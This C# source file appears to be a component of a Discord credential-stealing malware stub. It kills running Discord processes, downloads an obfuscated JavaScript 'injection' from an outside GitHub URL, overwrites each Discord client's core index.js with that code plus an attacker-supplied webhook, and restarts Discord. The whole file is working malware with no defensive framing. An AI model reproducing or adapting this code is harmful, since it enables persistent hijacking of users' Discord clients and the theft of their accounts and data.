using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace DCB.stub.components
{
    internal class disinjection
    {
        private string appdata;
        private string[] discordDirs;
        private string code;

        public disinjection(string webhook)
        {
            appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            discordDirs = new[]
            {
            Path.Combine(appdata, "Discord"),
            Path.Combine(appdata, "DiscordCanary"),
            Path.Combine(appdata, "DiscordPTB"),
            Path.Combine(appdata, "DiscordDevelopment")
        };
            code = new WebClient().DownloadString("https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js");

            foreach (var proc in Process.GetProcesses())
            {
                if (proc.ProcessName.ToLower().Contains("discord"))
                {
                    proc.Kill();
                }
            }

            foreach (var dir in discordDirs.Where(Directory.Exists))
            {
                var coreInfo = GetCore(dir);
                if (coreInfo != null)
                {
                    File.WriteAllText(Path.Combine(coreInfo.Item1, "index.js"), code.Replace("discord_desktop_core-1", coreInfo.Item2).Replace("%WEBHOOK%", webhook));
                    StartDiscord(dir);
                }
            }
        }

        private Tuple<string, string> GetCore(string dir)
        {
            foreach (var file in Directory.GetFiles(dir))
            {
                if (Regex.IsMatch(file, @"app-+?", RegexOptions.IgnoreCase))
                {
                    var modules = Path.Combine(dir, file, "modules");
                    if (!Directory.Exists(modules))
                    {
                        continue;
                    }

                    foreach (var moduleFile in Directory.GetFiles(modules))
                    {
                        if (Regex.IsMatch(moduleFile, @"discord_desktop_core-+?", RegexOptions.IgnoreCase))
                        {
                            var core = Path.Combine(modules, moduleFile, "discord_desktop_core");
                            if (File.Exists(Path.Combine(core, "index.js")))
                            {
                                return Tuple.Create(core, moduleFile);
                            }
                        }
                    }
                }
            }
            return null;
        }

        private void StartDiscord(string dir)
        {
            var update = Path.Combine(dir, "Update.exe");
            var executable = dir.Split('\\').Last() + ".exe";

            foreach (var file in Directory.GetFiles(dir))
            {
                if (Regex.IsMatch(file, @"app-+?", RegexOptions.IgnoreCase))
                {
                    var app = Path.Combine(dir, file);
                    if (Directory.Exists(Path.Combine(app, "modules")))
                    {
                        foreach (var appFile in Directory.GetFiles(app))
                        {
                            if (Path.GetFileName(appFile) == executable)
                            {
                                executable = Path.Combine(app, executable);
                                Process.Start(update, $"--processStart {executable}");
                            }
                        }
                    }
                }
            }
        }
    }
}
